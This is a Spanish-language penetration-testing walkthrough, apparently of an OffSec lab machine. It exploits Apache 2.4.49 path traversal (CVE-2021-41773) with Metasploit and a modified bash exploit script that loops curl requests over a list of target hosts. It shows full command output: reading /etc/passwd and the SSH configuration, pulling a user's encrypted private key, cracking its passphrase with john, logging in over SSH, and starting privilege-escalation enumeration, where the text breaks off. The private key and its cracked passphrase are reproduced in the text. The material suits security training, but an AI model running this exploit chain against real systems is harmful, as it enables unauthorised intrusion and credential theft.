192.168.231.245  80    tcp    http      open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.231.245  443   tcp    ssl/http  open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
192.168.231.245  2222  tcp    ssh       open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 Ubuntu Linux; protocol 2.0
192.168.231.245  8000  tcp    http      open   Apache httpd 2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8

msf6 > vulns

Vulnerabilities
===============

Timestamp                Host             Name                     References
---------                ----             ----                     ----------
2025-06-05 19:53:16 UTC  192.168.180.249  Generic Payload Handler

msf6 > hosts

Hosts
=====

address          mac  name             os_name       os_flavor  os_sp  purpose  info  comments
-------          ---  ----             -------       ---------  -----  -------  ----  --------
192.168.180.249       LEGACY           Windows 2022                    server
192.168.231.245       192.168.231.245  Linux                    5.X    server

msf6 > 
```

2. Buscamos y confirmamos por **path traversal**
```bash
msf6 auxiliary(scanner/http/apache_normalize_path) > set CVE CVE-2021-41773
CVE => CVE-2021-41773
msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS 192.168.231.245
RHOSTS => 192.168.231.245
msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 80
RPORT => 80
msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGETURI /cgi-bin
TARGETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[+] http://192.168.231.245:80 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
> Por defecto ejecutamos la accion para buscar por **_Path Traversal_** 

```bash
msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS 192.168.229.245
RHOSTS => 192.168.229.245
msf6 auxiliary(scanner/http/apache_normalize_path) > set CVE CVE-2021-41773
CVE => CVE-2021-41773
msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 80
RPORT => 80
msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGUETURI /cgi-bin
[!] Unknown datastore option: TARGUETURI. Did you mean TARGETURI?
TARGUETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set TARGETURI /cgi-bin
TARGETURI => /cgi-bin
msf6 auxiliary(scanner/http/apache_normalize_path) > set ACTION CHECK_RCE
ACTION => CHECK_RCE
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[-] http://192.168.229.245:80 - The target is not vulnerable to CVE-2021-41773 (requires mod_cgi to be enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > set ACTION REED_FILE
ACTION => REED_FILE
msf6 auxiliary(scanner/http/apache_normalize_path) > run
[+] http://192.168.229.245:80 - The target is vulnerable to CVE-2021-41773.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > 
```
> Podemos ver que **192.168.xxx.245** no es vulnerable a RCE porque no hay un cgi valido activo.

3. Explotamos **192.168.xxx.245**
   * Buscamos en [exploitDB](https://www.exploit-db.com/exploits/50383)
   * Modificamos el exploit a nuestras necesidades:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# cat 245-poc.sh                   
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
    echo "Uso: $0 [TARGETS.TXT] [PATH] [COMMAND]"
    echo "Ejemplo: $0 targets.txt /bin/sh whoami"
    exit 1
fi

TARGETS=$1
PATH_TO=$2
CMD=$3

for host in $(cat "$TARGETS"); do
    echo "[*] Atacando $host..."
    RESPONSE=$(curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $CMD" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$PATH_TO")
    echo "$RESPONSE"
    echo "-----------------------------------"
done
```
- **Ejecutamos**

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# ./245-poc.sh targets.txt /etc/passwd ""
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: -z: not found
./245-poc.sh: 12: -z: not found
[*] Atacando 192.168.231.245...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
-----------------------------------
```

#### Usuarios de 192.168.xxx.245:

```bash
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
```

> Muchos doritos despues tras un proceso de enumeracion

```bash
# primer indicio positivo de direccion de busqueda
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/ssh           
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.229.245/cgi-bin/../../../../../../../../../../etc/ssh/">here</a>.</p>
</body></html>

# archivos de configuracion ssh
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/ssh/sshd_config         
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile .ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/ssh/ssh_config 
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
```
#### Accedemos a claves publicas y archivos de configuracion:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/group              
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,offsec
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:offsec
floppy:x:25:
tape:x:26:
sudo:x:27:offsec
audio:x:29:
dip:x:30:offsec
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:offsec
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:offsec
systemd-coredump:x:999:
offsec:x:1000:
miranda:x:1001:
steven:x:1002:
mark:x:1003:
anita:x:1004:
apache:x:998:anita
ssl-cert:x:117:
ftp:x:118:
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/hosts
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
127.0.0.1 localhost
127.0.1.1 web01

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/crontab
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/hostname
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
web01
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/shadow  
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/environment
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/profile    
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/issue  
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
Ubuntu 20.04.5 LTS \n \l

                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /etc/ssh/ssh_host_rsa_key.pub
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkRPaVboTfq+VZYyf1bsUlg+WZrPP1F6fRrA0TNkHmamfuFAhW9XfCiuh2GOnSkNeGUXLcMAgMtbki6uj4l6vTw5/pqM/jBz00be6Ty+g0CDz9gmb+p0iX+8vCeG6aB0vea9bvkjaABticCS1CmUEbfEe/jCn/11c4NmHleCFfVxE8PBRE2OyVWlFQkkcB74O0FS4AOfbnrAx3pAF4rcd7XsTgi4V1e/sKZ8RIcTlueVdnzZEMcpLeZXUR1cXsJ9zwklFLuMWuUjonYC7BFvT+Bf81jlO1/e9B0RxfalfCfeUthSoa2VGwpfvesCdHl0exvy1PXaeR2XUX5ZJ0jmoP7cvj1rb+ZrnUU/Sie0qpVklHpkjggz0li7Mk4h/CI+est9oeHP+UXVv+Xl/jpnXz/RX/1y03wkTe9Pygxo3NsLdrs22/UCQ5GZ5x78UJQBXCCI93KHY1BG28B9V8xT9PGmpFDgjnF3pFuZoMevmeHSVNBlNQV42/qFCJr48XbAM= root@web01
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /home/anita/.ssh/authorized_keys
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /home/anita/.ssh/id_rsa
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /home/anita/.ssh/id_ed25519
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

# Obtenemos el id_ecdsa
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ./245-poc.sh targets.txt /home/anita/.ssh/id_ecdsa
./245-poc.sh: 12: [[: not found
./245-poc.sh: 12: [[: not found
192.168.229.245
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# nano id_ecdsa_anita                  
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# nano id_ecdsa_anita
                                                                                                       
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# chmod 600 id_ecdsa_anita
```

#### Crackeamos con john:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# /usr/share/john/ssh2john.py id_ecdsa_anita > id_ecdsa_anita.hash 
                                                                                                                                         
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# cat id_ecdsa_anita.hash              
id_ecdsa_anita:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e6973743235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0f7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183
                                                                                                                                         
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# rm -rf id_ecdsa_anita.hash  
                                                                                                                                         
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# /usr/share/john/ssh2john.py id_ecdsa_anita > id_ecdsa_anita.hash
                                                                                                                                         
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# john id_ecdsa_anita.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fireball         (id_ecdsa_anita)     
1g 0:00:04:37 DONE (2025-06-07 21:39) 0.003606g/s 14.77p/s 14.77c/s 14.77C/s musical..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Nos conectamos por ssh al usuario anita:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ssh -i id_ecdsa_anita -p 2222 anita@192.168.229.245
Enter passphrase for key 'id_ecdsa_anita': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 08 Jun 2025 01:17:08 AM UTC

  System load:  0.0               Processes:               150
  Usage of /:   67.2% of 7.77GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 192.168.229.245
  Swap usage:   0%


284 updates can be applied immediately.
217 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Nov 11 12:06:55 2022 from 192.168.118.2
$ ls
local.txt
$ cat local.txt
c784533ef1e4c4f51b572cfeb22c9709
$ 
```
#### Escalar privilegios en WEB01

1. Enumeramos y exporamos el primer vector

```bash
$ uname -a
Linux web01 5.4.0-128-generic #144-Ubuntu SMP Tue Sep 20 11:00:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
$ cat /etc/issue
Ubuntu 20.04.5 LTS \n \l

$ arch
x86_64
$ whoami
anita
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ who -a
           system boot  2024-03-29 07:20
           run-level 5  2024-03-29 07:20
LOGIN      tty1         2024-03-29 07:20               732 id=tty1
anita    + pts/0        2025-06-08 13:37   .          2165 (192.168.45.239)
$ sudo -l
[sudo] password for anita: 
Sorry, try again.
[sudo] password for anita: 
Sorry, try again.
[sudo] password for anita: 
sudo: 3 incorrect password attempts
$ find / -perm -4000 2>/dev/null
/usr/bin/at
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/snap/core18/2566/bin/mount
/snap/core18/2566/bin/ping
/snap/core18/2566/bin/su
/snap/core18/2566/bin/umount
/snap/core18/2566/usr/bin/chfn
/snap/core18/2566/usr/bin/chsh
/snap/core18/2566/usr/bin/gpasswd
/snap/core18/2566/usr/bin/newgrp
/snap/core18/2566/usr/bin/passwd
/snap/core18/2566/usr/bin/sudo
/snap/core18/2566/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2566/usr/lib/openssh/ssh-keysign
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/snap/snapd/17336/usr/lib/snapd/snap-confine
/snap/core20/1623/usr/bin/chfn
/snap/core20/1623/usr/bin/chsh
/snap/core20/1623/usr/bin/gpasswd
